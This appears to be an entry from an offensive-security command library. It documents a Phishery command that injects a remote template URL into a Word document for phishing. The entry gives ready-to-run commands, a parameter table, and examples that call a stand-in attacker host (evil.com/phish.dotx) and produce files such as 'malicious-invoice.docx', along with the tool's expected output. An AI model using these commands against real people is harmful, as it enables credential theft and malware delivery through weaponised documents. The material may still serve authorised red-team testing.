---
id: 9ec4e47a-02e2-45c3-a52c-cdbd3ef18ab4
name: phishery-inject-url-into-word-doc
type: command
executor: bash
data: phishery -u $_PHISHING_URL -i $_INPUT_DOCX -o $_OUTPUT_DOCX
output: null
created_at: '2023-04-06T03:56:23.926155+00:00'
updated_at: '2023-04-10T20:36:51.192671+00:00'
platforms:
  - Linux
  - Windows
tags:
  - phishing
  - office-injection
verified: true
validated: true
---

# phishery-inject-url-into-word-doc

## Command

```bash
phishery -u $_PHISHING_URL -i $_INPUT_DOCX -o $_OUTPUT_DOCX
```

## Description

This command uses the Phishery tool to inject an external template URL into a Word document (.docx), enabling phishing attacks via template loading. It modifies the document's internal XML to reference the URL, which can deliver malicious content when opened in Microsoft Word.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_PHISHING_URL | The URL of the malicious phishing template (e.g., https://evil.com/template.dotx) | Yes |
| -i $_INPUT_DOCX | Path to the original Word document to modify (e.g., invoice.docx) | Yes |
| -o $_OUTPUT_DOCX | Path for the output injected document (e.g., malicious-invoice.docx) | Yes |

## Examples

### Basic Usage

```bash
phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
```

### Advanced Usage

```bash
phishery -u https://evil.com/phish.dotx -i report.docx -o injected-report.docx
```

## Expected Output

```
[+] Opening Word document: good.docx
[+] Setting Word document template to: https://secure.site.local/docs
[+] Saving injected Word document to: bad.docx
[*] Injected Word document has been saved!
```

This indicates successful modification; the output file now references the template URL.

## Related

- [[procedures/Inject-Phishing-Template-into-Word-Document]]
- [[tools/Phishery]]
